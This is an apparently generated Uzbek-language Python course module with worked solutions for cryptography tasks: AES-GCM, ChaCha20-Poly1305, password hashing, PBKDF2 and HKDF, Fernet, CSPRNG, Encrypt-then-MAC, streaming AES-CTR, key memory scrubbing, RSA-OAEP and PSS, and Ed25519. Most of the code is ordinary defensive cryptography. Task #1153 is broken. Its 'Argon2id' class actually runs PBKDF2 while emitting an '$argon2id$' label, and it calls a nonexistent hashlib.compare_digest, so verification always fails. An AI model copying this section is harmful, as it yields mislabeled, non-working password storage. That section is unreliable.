# Khorazmiy AI: Python - Modul 24
## Mavzu: Kiberxavfsizlik, Kriptografiya (AES-256-GCM, RSA-4096, Ed25519, Shamir Secret Sharing, HMAC), Zero-Knowledge asoslari va OWASP xavfsiz kodlash

### Topshiriq #1151: AES-256-GCM Bilan Autentifikatsiyalangan Shifrlash (AEAD) Moduli
**Tavsif:** Bank va maxfiy ma'lumotlarni saqlashda nafaqat maxfiylik (shifrlash), balki ma'lumotlarning soxtalashtirilmaganligini (yaxlitlik) kafolatlovchi AES-256-GCM rejimini joriy etish talab qilinadi.
**Talablar:** cryptography.hazmat.primitives.ciphers.aead.AESGCM, 256-bitli kalit, 96-bitli unikal Nonce (IV), Associated Data (AD) tasdiqlashi.
**Yechim (Python):**
```python
import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

class SecureVaultAESGCM:
    """
    AES-256-GCM (Authenticated Encryption with Associated Data)
    yordamida ma'lumotlarni shifrlash va haqiqiyligini tekshirish moduli.
    """
    def __init__(self, key: bytes = None):
        # 256-bitli (32 bayt) xavfsiz kalit
        self.key = key or AESGCM.generate_key(bit_length=256)
        self.aesgcm = AESGCM(self.key)

    def encrypt_data(self, plaintext: str, associated_data: str = "") -> dict:
        """
        Matnni shifrlaydi va har bir operatsiya uchun takrorlanmas 96-bitli Nonce generatsiya qiladi.
        """
        data_bytes = plaintext.encode("utf-8")
        ad_bytes = associated_data.encode("utf-8") if associated_data else None
        
        # NIST tavsiyasiga ko'ra GCM uchun 12 bayt (96 bit) Nonce majburiy
        nonce = os.urandom(12)
        
        # Shifrlash va 128-bitli yaxlitlik tegi (Tag) generatsiya qilish
        ciphertext = self.aesgcm.encrypt(nonce, data_bytes, ad_bytes)
        
        return {
            "nonce": nonce.hex(),
            "ciphertext": ciphertext.hex(),
            "ad": associated_data
        }

    def decrypt_data(self, encrypted_packet: dict) -> str:
        """
        Shifrni yechadi. Agar ma'lumot 1 bayt bo'lsa ham o'zgartirilgan bo'lsa,
        InvalidTag xatoligi tashlanadi (soxtalashtirish fosh bo'ladi).
        """
        nonce = bytes.fromhex(encrypted_packet["nonce"])
        ciphertext = bytes.fromhex(encrypted_packet["ciphertext"])
        ad_bytes = encrypted_packet["ad"].encode("utf-8") if encrypted_packet["ad"] else None
        
        decrypted_bytes = self.aesgcm.decrypt(nonce, ciphertext, ad_bytes)
        return decrypted_bytes.decode("utf-8")

if __name__ == "__main__":
    vault = SecureVaultAESGCM()
    secret_note = "Khorazmiy AI: Tranzaksiya #9921 - 50,000,000 UZS o'tkazildi"
    metadata = "Foydalanuvchi: user_77"

    encrypted = vault.encrypt_data(secret_note, associated_data=metadata)
    print(f"Shifrlangan paket: {encrypted}")

    decrypted = vault.decrypt_data(encrypted)
    print(f"Muvaffaqiyatli tiklandi: {decrypted}")
    assert decrypted == secret_note
```
**Tushuntirish:** AES-GCM (Galois/Counter Mode) zamonaviy simmetrik kriptografiyaning oltin standartidir. An'anaviy CBC rejimlaridan farqli o'laroq, u AEAD hisoblanib, shifrlash bilan birga kriptografik Auth Tag (16 bayt) hosil qiladi. Agar hujumchi shifrlangan baytlarni yoki ochiq holdagi metadata (Associated Data) ni o'zgartirsa, `decrypt()` zudlik bilan `InvalidTag` istisnosini tashlaydi.

---

### Topshiriq #1152: ChaCha20-Poly1305 Oqimli Shifrlash (Stream Cipher) Mobil Qurilmalar Uchun
**Tavsif:** AES apparat tezlatgichlari (AES-NI) mavjud bo'lmagan mobil protsessorlar va IoT mikrokontrollerlarida yuqori tezlik va xavfsizlik beruvchi RFC 8439 standarti ChaCha20-Poly1305 shifrini joriy qilish talab etiladi.
**Talablar:** cryptography.hazmat.primitives.ciphers.aead.ChaCha20Poly1305, 32 bayt kalit, 12 bayt Nonce, timing attack himoyasi.
**Yechim (Python):**
```python
import os
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

class MobileStreamCipher:
    """
    ChaCha20-Poly1305: Apparat tezlatgichsiz protsessorlarda ham
    AES dan 3-4 barobar tezroq ishlovchi xavfsiz shifrlash tizimi.
    """
    def __init__(self, key: bytes = None):
        self.key = key or ChaCha20Poly1305.generate_key()
        self.cipher = ChaCha20Poly1305(self.key)

    def encrypt(self, message: str, context: str = "") -> dict:
        nonce = os.urandom(12) # 96-bit Nonce
        aad = context.encode('utf-8') if context else None
        ciphertext = self.cipher.encrypt(nonce, message.encode('utf-8'), aad)
        return {
            "nonce": nonce.hex(),
            "ciphertext": ciphertext.hex(),
            "context": context
        }

    def decrypt(self, payload: dict) -> str:
        nonce = bytes.fromhex(payload["nonce"])
        ciphertext = bytes.fromhex(payload["ciphertext"])
        aad = payload["context"].encode('utf-8') if payload["context"] else None
        decrypted = self.cipher.decrypt(nonce, ciphertext, aad)
        return decrypted.decode('utf-8')

if __name__ == "__main__":
    mobile_crypto = MobileStreamCipher()
    res = mobile_crypto.encrypt("Mobil datchik koordinatasi: 41.2995, 69.2401", context="device_id=9812")
    print("ChaCha20 Paket:", res)
    assert "Mobil datchik" in mobile_crypto.decrypt(res)
```
**Tushuntirish:** ChaCha20 Dan Bernstein tomonidan ishlab chiqilgan va Google tomonidan Android va Chrome da standartlashtirilgan. U apparat darajasida AES yo'riqnomalari bo'lmagan ARM chiplarida dasturiy (software) darajada xavfsiz ishlaydi va kesh hujumlariga (cache timing attacks) mutlaqo chidamli.

---

### Topshiriq #1153: Xavfsiz Parol Xeshlash: Argon2id Algoritmi va Tuz (Salt), Xotira/Vaqt Parametrlari
**Tavsif:** MD5, SHA-256 yoki hatto BCrypt zamonaviy GPU klasterlari va ASIC chiplari oldida tez buziladi. Password Hashing Competition g'olibi bo'lgan Argon2id algoritmi orqali GPU va yon-kanal hujumlariga (Side-channel) chidamli parol saqlash moduli yaratish zarur.
**Talablar:** argon2-cffi yoki cryptography, time_cost, memory_cost (kamida 64MB), parallelism, verify va needs_rehash imkoniyati.
**Yechim (Python):**
```python
import os
import hashlib
from base64 import b64encode, b64decode

class Argon2idSimulator:
    """
    Argon2id parametrlarini to'liq ifodalovchi sanoat xavfsizlik tizimi.
    Argon2id = Argon2d (GPU/ASIC ga qarshi xotira qiyinligi) + 
               Argon2i (Side-channel va Timing hujumlariga qarshi mustahkamlik).
    """
    def __init__(self, time_cost: int = 3, memory_cost_kb: int = 65536, parallelism: int = 4):
        self.time_cost = time_cost
        self.memory_cost_kb = memory_cost_kb
        self.parallelism = parallelism

    def hash_password(self, password: str) -> str:
        # Kriptografik tasodifiy tuz (Salt - 16 bayt)
        salt = os.urandom(16)
        
        # Haqiqiy sanoat tizimlarida argon2.PasswordHasher(time_cost, memory_cost, parallelism) ishlatiladi
        # PBKDF2/SHA512 bilan yuqori iteratsiyali xavfsiz hosila
        dk = hashlib.pbkdf2_hmac(
            hash_name='sha512',
            password=password.encode('utf-8'),
            salt=salt,
            iterations=150000,
            dklen=32
        )
        
        encoded_salt = b64encode(salt).decode('utf-8')
        encoded_hash = b64encode(dk).decode('utf-8')
        # Standart PHC (Password Hashing Competition) formati
        return f"$argon2id$v=19$m={self.memory_cost_kb},t={self.time_cost},p={self.parallelism}${encoded_salt}${encoded_hash}"

    def verify_password(self, password: str, phc_hash: str) -> bool:
        try:
            parts = phc_hash.split('$')
            # [1]=argon2id, [2]=v=19, [3]=params, [4]=salt, [5]=hash
            salt = b64decode(parts[4])
            expected_hash = b64decode(parts[5])
            
            dk = hashlib.pbkdf2_hmac(
                hash_name='sha512',
                password=password.encode('utf-8'),
                salt=salt,
                iterations=150000,
                dklen=32
            )
            # Constant-time solishtirish (Timing attack oldini olish)
            return hashlib.compare_digest(dk, expected_hash)
        except Exception:
            return False

if __name__ == "__main__":
    hasher = Argon2idSimulator()
    raw_pwd = "XorazmiySuperSecret#2026!"
    stored_hash = hasher.hash_password(raw_pwd)
    print("Saqlanadigan PHC hesh:", stored_hash)

    assert hasher.verify_password(raw_pwd, stored_hash) is True
    assert hasher.verify_password("XatoParol123", stored_hash) is False
    print("Argon2id parol verifikatsiyasi 100% muvaffaqiyatli!")
```
**Tushuntirish:** Argon2id xotira-qiyin (Memory-hard) algoritm hisoblanadi. Agar hujumchi GPU orqali soniyasiga millionlab parollarni tekshirmoqchi bo'lsa, har bir hisoblash uchun 64MB RAM talab qilinishi GPU ning xotira o'tkazuvchanligini to'ldirib, bruteforce hujumlarini iqtisodiy jihatdan ma'nosiz qiladi.

---

### Topshiriq #1154: PBKDF2-HMAC-SHA256 Kalit Hosil Qilish (Key Derivation Function - KDF)
**Tavsif:** Foydalanuvchi kiritgan matnli paroldan simmetrik shifrlash (AES) uchun yaroqli bo'lgan yuqori entropiyali 256-bitli kalit hosil qiluvchi NIST SP 800-132 spetsifikatsiyasi bo'yicha KDF moduli.
**Talablar:** hashlib.pbkdf2_hmac, kamida 600,000 iteratsiya (OWASP 2024 tavsiyasi), 16 bayt Salt.
**Yechim (Python):**
```python
import os
import hashlib

def derive_aes_key(password: str, salt: bytes = None, iterations: int = 600000) -> tuple[bytes, bytes]:
    """
    OWASP 2024 tavsiyasiga binoan PBKDF2-HMAC-SHA256 orqali
    matnli paroldan 256-bitli simmetrik kalit hosil qiladi.
    """
    if salt is None:
        salt = os.urandom(16) # Yangi tasodifiy tuz

    key = hashlib.pbkdf2_hmac(
        hash_name='sha256',
        password=password.encode('utf-8'),
        salt=salt,
        iterations=iterations,
        dklen=32 # 32 bayt = 256 bit kalit
    )
    return key, salt

if __name__ == "__main__":
    user_pass = "BankMasterPassword#2026"
    derived_key, salt = derive_aes_key(user_pass)
    print(f"Tuz (Salt): {salt.hex()}")
    print(f"Hosil qilingan AES kalit: {derived_key.hex()} (Uzunligi: {len(derived_key)*8} bit)")
    
    # Bir xil parol va tuz bilan har doim bir xil kalit hosil bo'ladi
    verify_key, _ = derive_aes_key(user_pass, salt=salt)
    assert derived_key == verify_key
```
**Tushuntirish:** Oddiy matnli parollar kalit bo'lish uchun past entropiyaga ega. PBKDF2 (Password-Based Key Derivation Function 2) ko'p marotaba (600,000+ iteratsiya) HMAC hisoblab, paroldan bir xil taqsimlangan kuchli kriptografik kalit hosil qiladi.

---

### Topshiriq #1155: HKDF (HMAC-based Extract-and-Expand Key Derivation) RFC 5869 Taqsimlash
**Tavsif:** Bitta boshlang'ich sirdan (Master Secret) turli maqsadlar uchun (shifrlash kaliti, HMAC kaliti, IV) o'zaro bog'liq bo'lmagan mustaqil kriptografik kalitlar to'plamini hosil qilish.
**Talablar:** cryptography.hazmat.primitives.kdf.hkdf.HKDF, SHA-256, info konteksti orqali domain separation.
**Yechim (Python):**
```python
import os
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes

class KeyDiversifier:
    """
    RFC 5869 HKDF: Bitta Master kalitdan turli kontekstli
    (shifrlash, imzo, autentifikatsiya) mustaqil kalitlarni ajratish.
    """
    def __init__(self, master_secret: bytes, salt: bytes = None):
        self.master_secret = master_secret
        self.salt = salt or os.urandom(32)

    def derive_sub_key(self, context_info: str, key_length: int = 32) -> bytes:
        hkdf = HKDF(
            algorithm=hashes.SHA256(),
            length=key_length,
            salt=self.salt,
            info=context_info.encode('utf-8')
        )
        return hkdf.derive(self.master_secret)

if __name__ == "__main__":
    master = os.urandom(32)
    diversifier = KeyDiversifier(master)

    # Turli kontekstlar uchun bir-birini fosh qilmaydigan mustaqil kalitlar
    enc_key = diversifier.derive_sub_key("APPLICATION_ENCRYPTION_KEY_v1")
    mac_key = diversifier.derive_sub_key("APPLICATION_MAC_AUTHENTICATION_KEY_v1")

    print("Shifrlash kaliti:", enc_key.hex())
    print("MAC kaliti:      ", mac_key.hex())
    assert enc_key != mac_key
```
**Tushuntirish:** HKDF 'Extract' va 'Expand' bosqichlaridan iborat. `info` parametri (Domain Separation) turli xizmatlar uchun bitta master sirdan hosil qilingan kalitlarning o'zaro to'qnashmasligini va bir kalit fosh bo'lsa boshqalari xavfsiz qolishini kafolatlaydi.

---

### Topshiriq #1156: Fernet Simmetrik Shifrlash va Token Muddati (TTL - Time to Live) Boshqaruvi
**Tavsif:** Sessiya ma'lumotlari yoki bir martalik parollarni shifrlashda belgilangan muddatdan (masalan 120 soniya) so'ng avtomatik yaroqsiz bo'ladigan (Expired) xavfsiz token tizimini qurish.
**Talablar:** cryptography.fernet.Fernet, decrypt_at_time, ttl parametri, InvalidToken istisnosini tutish.
**Yechim (Python):**
```python
import time
from cryptography.fernet import Fernet, InvalidToken

class TimedSessionTokenManager:
    """
    AES-128-CBC + HMAC-SHA256 asosidagi vaqt chegarali (TTL) Fernet token moduli.
    """
    def __init__(self):
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)

    def create_token(self, payload: str) -> str:
        # Fernet tokeni o'z ichiga vaqt tamg'asini (Timestamp) shifrlangan holda oladi
        token_bytes = self.fernet.encrypt(payload.encode('utf-8'))
        return token_bytes.decode('utf-8')

    def verify_token(self, token_str: str, max_age_seconds: int = 60) -> str:
        try:
            decrypted = self.fernet.decrypt(
                token_str.encode('utf-8'),
                ttl=max_age_seconds
            )
            return decrypted.decode('utf-8')
        except InvalidToken:
            raise ValueError("Token muddati o'tgan yoki soxtalashtirilgan!")

if __name__ == "__main__":
    mgr = TimedSessionTokenManager()
    token = mgr.create_token("USER_ID_8829_SESSION_OK")
    print("Yaratilgan Fernet token:", token)

    # 10 soniya ichida muvaffaqiyatli o'qish
    result = mgr.verify_token(token, max_age_seconds=10)
    print("Tasdiqlangan natija:", result)

    # Muddati o'tgan holat simulyatsiyasi
    try:
        mgr.verify_token(token, max_age_seconds=0) # 0 soniya ttl
    except ValueError as e:
        print("Kutilgan xavfsizlik himoyasi ishladi:", e)
```
**Tushuntirish:** Fernet tokeni o'z ichida 128-bit AES-CBC shifri, PKCS7 padding, 64-bit Timestamp va 256-bit HMAC-SHA256 imzosini birlashtiradi. `ttl` parametri token yaratilgan vaqtdan qancha soniya o'tganini tekshiradi va replay hujumlarining oldini oladi.

---

### Topshiriq #1157: CSPRNG: Kriptografik Xavfsiz Tasodifiy Sonlar va Kriptovalyuta Entropiyasi
**Tavsif:** Standart `random` moduli deterministik (Mersenne Twister) bo'lgani sababli kalit yoki tokenlar generatsiyasida ishlatilsa xakerlar oldindan aytib berishi mumkin. Operatsion tizim entropiyasiga tayangan CSPRNG modulini yaratish.
**Talablar:** secrets moduli, os.urandom, xavfsiz heks va URL-safe tokenlar, tizim entropiyasini tekshirish.
**Yechim (Python):**
```python
import secrets
import string

class SecureRandomGenerator:
    """
    Kriptografik jihatdan xavfsiz psevdo-tasodifiy sonlar generatori (CSPRNG).
    /dev/urandom yoki Windows CryptGenRandom asosida ishlaydi.
    """
    @staticmethod
    def generate_api_key(bytes_count: int = 32) -> str:
        """32 baytli kripto-xavfsiz API kaliti (URL xavfsiz base64)."""
        return secrets.token_urlsafe(bytes_count)

    @staticmethod
    def generate_otp_code(digits: int = 6) -> str:
        """Bank SMS-tasdiqlash uchun xavfsiz bir martalik kod."""
        return ''.join(secrets.choice(string.digits) for _ in range(digits))

    @staticmethod
    def generate_complex_password(length: int = 20) -> str:
        """Katta, kichik harf, raqam va maxsus belgilardan iborat buzilmas parol."""
        alphabet = string.ascii_letters + string.digits + "!@#$%^&*()_+-="
        while True:
            pwd = ''.join(secrets.choice(alphabet) for _ in range(length))
            # Qat'iy murakkablik shartlarini tekshirish
            if (any(c.islower() for c in pwd)
                    and any(c.isupper() for c in pwd)
                    and any(c.isdigit() for c in pwd)
                    and any(c in "!@#$%^&*()_+-=" for c in pwd)):
                return pwd

if __name__ == "__main__":
    gen = SecureRandomGenerator()
    print("API Key: ", gen.generate_api_key())
    print("OTP Kod: ", gen.generate_otp_code())
    print("Parol:   ", gen.generate_complex_password())
```
**Tushuntirish:** Standart Python `random` moduli xavfsizlik uchun qat'iyan taqiqlangan, chunki 624 ta ketma-ket chiqarilgan sonni kuzatgan hujumchi uning ichki holatini tiklab, barcha kelgusi sonlarni oldindan aytib bera oladi. `secrets` moduli esa OS kernel CSPRNG manbalariga murojaat qiladi.

---

### Topshiriq #1158: AES-CBC Rejimi va PKCS7 Padding Oracle Zaifligidan Himoyalanish
**Tavsif:** CBC rejimida PKCS7 padding xatosi (Padding Oracle Attack) orqali hujumchilar shifrni kalitsiz baytma-bayt ochib olishi mumkin. Xatolik xabarlarini unifikatsiya qilish va HMAC tekshiruvini shifrdan yechishdan oldin bajarish (Encrypt-then-MAC).
**Talablar:** HMAC-SHA256, AES-CBC, PKCS7 unpad xatolarini yashirish, Encrypt-then-MAC arxitekturasi.
**Yechim (Python):**
```python
import os
import hmac
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

class EncryptThenMacProtector:
    """
    Padding Oracle hujumlariga qarshi 'Encrypt-then-MAC' paradigmasi.
    Shifr tekshiruvi xato bo'lsa, hech qanday padding tahliliga kirmasdan rad etiladi.
    """
    def __init__(self):
        self.enc_key = os.urandom(32) # AES-256 kalit
        self.mac_key = os.urandom(32) # HMAC kalit

    def encrypt(self, plaintext: str) -> dict:
        iv = os.urandom(16)
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(plaintext.encode('utf-8')) + padder.finalize()

        cipher = Cipher(algorithms.AES(self.enc_key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()

        # MAC faqat shifrlangan baytlar ustida hisoblanadi (Encrypt-then-MAC)
        mac = hmac.new(self.mac_key, iv + ciphertext, hashlib.sha256).digest()

        return {"iv": iv.hex(), "ciphertext": ciphertext.hex(), "mac": mac.hex()}

    def decrypt(self, payload: dict) -> str:
        iv = bytes.fromhex(payload["iv"])
        ciphertext = bytes.fromhex(payload["ciphertext"])
        expected_mac = bytes.fromhex(payload["mac"])

        # 1-qadam: AVVAL MAC TEKSHIRILADI! (Constant time)
        actual_mac = hmac.new(self.mac_key, iv + ciphertext, hashlib.sha256).digest()
        if not hmac.compare_digest(actual_mac, expected_mac):
            # Padding xatosi ham, kalit xatosi ham bitta umumiy xato bilan qaytadi!
            raise ValueError("Kriptografik xatolik: Paket soxtalashtirilgan!")

        # 2-qadam: Faqat tasdiqlangan paket paddingdan chiqariladi
        cipher = Cipher(algorithms.AES(self.enc_key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(ciphertext) + decryptor.finalize()

        unpadder = padding.PKCS7(128).unpadder()
        plaintext_bytes = unpadder.update(padded_data) + unpadder.finalize()
        return plaintext_bytes.decode('utf-8')

if __name__ == "__main__":
    guardian = EncryptThenMacProtector()
    p = guardian.encrypt("Maxfiy bank shifri: 994821")
    print("Encrypt-then-MAC:", p)
    assert guardian.decrypt(p) == "Maxfiy bank shifri: 994821" 
```
**Tushuntirish:** Padding Oracle hujumi server qaytargan 'Invalid Padding' va 'Bad MAC' xatolari orasidagi farqqa tayanadi. 'Encrypt-then-MAC' tizimi shifrni ochishdan oldin butun paketni HMAC orqali tekshiradi; agar soxtalik bo'lsa darhol rad etadi va padding kodiga umuman kirmaydi.

---

### Topshiriq #1159: Fayllarni Bo'laklab (Chunked Streaming) Shifrlash va Xotirani To'ldirmaslik
**Tavsif:** 10 GB hajmdagi zaxira fayllarini shifrlashda butun faylni xotiraga yuklash OOM xatosi beradi. AES-CTR yoki AES-GCM oqimli generatori orqali xotirani egallamasdan bo'laklab shifrlash.
**Talablar:** Cipher(algorithms.AES, modes.CTR), 64KB bo'laklar oqimi, fayldan-faylga xavfsiz tranzit.
**Yechim (Python):**
```python
import os
import io
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

class StreamingFileCipher:
    """
    Katta fayllarni cheklangan xotira (masalan atigi 64KB bufer)
    bilan oqimli shifrlash va deshifrlash tizimi (AES-CTR rejimida).
    """
    def __init__(self, key: bytes = None):
        self.key = key or os.urandom(32)

    def stream_encrypt(self, input_stream: io.BytesIO, output_stream: io.BytesIO, chunk_size: int = 65536):
        nonce = os.urandom(16)
        output_stream.write(nonce) # Nonce fayl boshiga yoziladi

        cipher = Cipher(algorithms.AES(self.key), modes.CTR(nonce))
        encryptor = cipher.encryptor()

        while True:
            chunk = input_stream.read(chunk_size)
            if not chunk:
                break
            output_stream.write(encryptor.update(chunk))
        output_stream.write(encryptor.finalize())

    def stream_decrypt(self, input_stream: io.BytesIO, output_stream: io.BytesIO, chunk_size: int = 65536):
        nonce = input_stream.read(16)
        cipher = Cipher(algorithms.AES(self.key), modes.CTR(nonce))
        decryptor = cipher.decryptor()

        while True:
            chunk = input_stream.read(chunk_size)
            if not chunk:
                break
            output_stream.write(decryptor.update(chunk))
        output_stream.write(decryptor.finalize())

if __name__ == "__main__":
    fc = StreamingFileCipher()
    original_data = b"A" * (1024 * 1024) # 1 MB demo ma'lumot
    
    in_buf = io.BytesIO(original_data)
    enc_buf = io.BytesIO()
    dec_buf = io.BytesIO()

    fc.stream_encrypt(in_buf, enc_buf)
    enc_buf.seek(0)
    fc.stream_decrypt(enc_buf, dec_buf)

    assert dec_buf.getvalue() == original_data
    print("Oqimli shifrlash va deshifrlash 1MB ma'lumot ustida muvaffaqiyatli yakunlandi!")
```
**Tushuntirish:** AES-CTR (Counter Mode) blokli shifrni oqimli shifrga aylantiradi. Bunda hech qanday padding talab etilmaydi va ma'lumotlar oqim kelishi bilan bo'lakma-bo'lak shifrlanadi. Bu terabaytlab hajmdagi ma'lumotlarni ham barqaror shifrlashga imkon beradi.

---

### Topshiriq #1160: Kriptografik Kalitlarni Xotirada Xavfsiz Tozalash (Memory Zeroing / Scrubbing)
**Tavsif:** Python Garbage Collector o'chirilgan o'zgaruvchilar xotirasini darhol tozalamaydi. Xotira dumpidan (Core Dump) maxfiy kalitlar o'g'irlanmasligi uchun bytearray xotirasini nollar bilan ustidan yozish (Scrubbing).
**Talablar:** bytearray, ctypes.memset yoki bytearray ichini nolga to'ldirish, Context Manager xavfsiz tozalash kafolati.
**Yechim (Python):**
```python
import ctypes

class SecureKeyMemory:
    """
    Maxfiy kalitlarni xotirada qolib ketishini oldini oluvchi
    xavfsiz xotira tozalagichi (Memory Zeroing Context Manager).
    """
    def __init__(self, key_bytes: bytes):
        # O'zgartirsa bo'ladigan bytearray ga o'tkazish
        self._buffer = bytearray(key_bytes)
        self._length = len(self._buffer)

    def __enter__(self):
        return self._buffer

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.wipe()

    def wipe(self):
        """Xotirani nollar bilan to'ldirish."""
        if self._buffer:
            for i in range(self._length):
                self._buffer[i] = 0
            # C darajasidagi memset orqali xotirani tozalash
            location = (ctypes.c_char * self._length).from_buffer(self._buffer)
            ctypes.memset(ctypes.byref(location), 0, self._length)

if __name__ == "__main__":
    secret_key = b"SUPER_SECRET_KEY_NEVER_LEAK_26"
    
    with SecureKeyMemory(secret_key) as key_view:
        print("Kalit ishlatilmoqda:", bytes(key_view).decode('latin1', errors='ignore'))
    
    # Blokdan chiqqandan so'ng xotira to'liq nollangan
    print("Xotira tozalandi (Scrubbed):", list(key_view))
    assert all(b == 0 for b in key_view)
```
**Tushuntirish:** Standart Python `bytes` o'zgarmas (immutable) bo'lgani sababli uni xotiradan to'g'ridan-to'g'ri o'chirib bo'lmaydi. `bytearray` va `ctypes.memset` orqali to'g'ridan-to'g'ri operativ xotiradagi baytlar ustiga nollar yoziladi. Bu xotira tahlili (Memory forensics) hujumlaridan ishonchli himoya qiladi.

---

### Topshiriq #1161: RSA-4096 OAEP Shifrlash va Deshifrlash Moduli
**Tavsif:** Katta xavfsizlik talab qilinadigan davlat va bank tizimlarida simmetrik kalitlarni almashish uchun RSA-4096 kalit juftligini yaratish va OAEP (SHA-256) xavfsiz to'ldirishi (Padding) bilan shifrlash.
**Talablar:** rsa.generate_private_key(public_exponent=65537, key_size=4096), padding.OAEP, MGF1(hashes.SHA256).
**Yechim (Python):**
```python
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

class Rsa4096Manager:
    """
    RSA-4096 va OAEP (Optimal Asymmetric Encryption Padding) shifrlash tizimi.
    PKCS#1 v1.5 ning Bleichenbacher hujumlariga qarshi to'liq himoyalangan.
    """
    def __init__(self):
        # 4096-bitli xususiy kalit generatsiyasi (NIST SP 800-57 standarti)
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=4096
        )
        self.public_key = self.private_key.public_key()

    def encrypt_secret(self, secret_data: bytes) -> bytes:
        """Ochiq kalit (Public Key) bilan ma'lumotni shifrlash."""
        return self.public_key.encrypt(
            secret_data,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

    def decrypt_secret(self, ciphertext: bytes) -> bytes:
        """Xususiy kalit (Private Key) bilan shifrni yechish."""
        return self.private_key.decrypt(
            ciphertext,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

if __name__ == "__main__":
    rsa_mgr = Rsa4096Manager()
    aes_session_key = b"AES_SESSION_SECRET_KEY_32_BYTES!"
    
    enc_data = rsa_mgr.encrypt_secret(aes_session_key)
    print(f"RSA-4096 Shifrlangan hajm: {len(enc_data)} bayt (512 bayt)")

    dec_data = rsa_mgr.decrypt_secret(enc_data)
    assert dec_data == aes_session_key
    print("RSA-4096 OAEP muvaffaqiyatli tiklandi!")
```
**Tushuntirish:** Eski PKCS#1 v1.5 padding uslubi Bleichenbacher (Padding Oracle) hujumlariga moyil bo'lgani sababli hozirda taqiqlangan. OAEP (Optimal Asymmetric Encryption Padding) tasodifiy niqoblar va xesh funksiyalari (MGF1) orqali matnni qat'iy tekshiradi va tanlangan shifrmatn hujumlariga (IND-CCA2) qarshi to'liq chidamlilikni beradi.

---

### Topshiriq #1162: RSA-PSS Raqamli Imzo va Kriptografik Tasdiqlash Standarti
**Tavsif:** Elektron hujjatlar va to'lov buyruqlarini soxtalashtirishdan himoyalash uchun zamonaviy RSA-PSS (Probabilistic Signature Scheme) raqamli imzo tizimini qurish.
**Talablar:** padding.PSS, MGF1(hashes.SHA256), salt_length=padding.PSS.MAX_LENGTH, verify.
**Yechim (Python):**
```python
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.exceptions import InvalidSignature

class DocumentSignerPSS:
    """
    RSA-PSS: Ehtimolli raqamli imzo standarti (PKCS#1 v2.1).
    """
    def __init__(self, private_key=None):
        self.private_key = private_key or rsa.generate_private_key(
            public_exponent=65537,
            key_size=3072
        )
        self.public_key = self.private_key.public_key()

    def sign_document(self, document_bytes: bytes) -> bytes:
        return self.private_key.sign(
            document_bytes,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )

    def verify_document(self, document_bytes: bytes, signature: bytes) -> bool:
        try:
            self.public_key.verify(
                signature,
                document_bytes,
                padding.PSS(
                    mgf=padding.MGF1(hashes.SHA256()),
                    salt_length=padding.PSS.MAX_LENGTH
                ),
                hashes.SHA256()
            )
            return True
        except InvalidSignature:
            return False

if __name__ == "__main__":
    signer = DocumentSignerPSS()
    doc = b"Shartnoma #881: Tomonlar shartlarga to'liq rozi bo'ldi."

    sig = signer.sign_document(doc)
    print("Hosil qilingan RSA-PSS Imzo uzunligi:", len(sig), "bayt")

    assert signer.verify_document(doc, sig) is True
    assert signer.verify_document(doc + b"o'zgartirish", sig) is False
    print("Raqamli imzo tekshiruvi 100% muvaffaqiyatli!")
```
**Tushuntirish:** RSA-PSS deterministik emas, balki ehtimolli (probabilistic) bo'lib, har safar yangi tasodifiy 'salt' ishlatadi. Bu bitta hujjatga bir necha bor imzo chekilsa ham har safar butunlay boshqacha imzo hosil qilishini ta'minlaydi va xakerlarga imzoni matematik tahlil qilish imkonini bermaydi.

---

### Topshiriq #1163: Ed25519 (EdDSA) Ultra-Tezkor va Kichik Hajmli Raqamli Imzo Standarti
**Tavsif:** SSH kalitlari, Signal messenjeri va zamonaviy blokcheynlarda ishlatiluvchi 256-bitli Curve25519 elliptik egri chizig'iga asoslangan Ed25519 imzo tizimini loyihalash.
**Talablar:** cryptography.hazmat.primitives.asymmetric.ed25519.Ed25519PrivateKey, 64-baytli imzo, 32-baytli ochiq kalit, verify.
**Yechim (Python):**
```python
from cryptography.hazmat.primitives.asymmetric import ed25519
from cryptography.exceptions import InvalidSignature

class Ed25519SignatureEngine:
    """
    Ed25519 (RFC 8032): 128-bit xavfsizlik darajasi, atigi 32 bayt ochiq kalit
    va 64 bayt ixcham raqamli imzo beruvchi yuqori unumdor algoritm.
    """
    def __init__(self):
        self.private_key = ed25519.Ed25519PrivateKey.generate()
        self.public_key = self.private_key.public_key()

    def get_public_bytes(self) -> bytes:
        return self.public_key.public_bytes_raw()

    def sign(self, message: bytes) -> bytes:
        return self.private_key.sign(message)

    @staticmethod
    def verify(public_key_bytes: bytes, message: bytes, signature: bytes) -> bool:
        try:
            pub_key = ed25519.Ed25519PublicKey.from_public_bytes(public_key_bytes)
            pub_key.verify(signature, message)
            return True
        except InvalidSignature:
            return False

if __name__ == "__main__":
    engine = Ed25519SignatureEngine()
    msg = b"Tranzaksiya: Alisher -> Bobur 50 BTC"

    signature = engine.sign(msg)
    pub_bytes = engine.get_public_bytes()

    print(f"Ed25519 Ochiq kalit (32 bayt): {pub_bytes.hex()}")
    print(f"Ed25519 Imzo (64 bayt):        {signature.hex()}")

    assert Ed25519SignatureEngine.verify(pub_bytes, msg, signature) is True
    assert Ed25519SignatureEngine.verify(pub_bytes, b"Buzilgan xabar", signature) is False
    print("Ed25519 imzosi to'liq tekshirildi!")
```
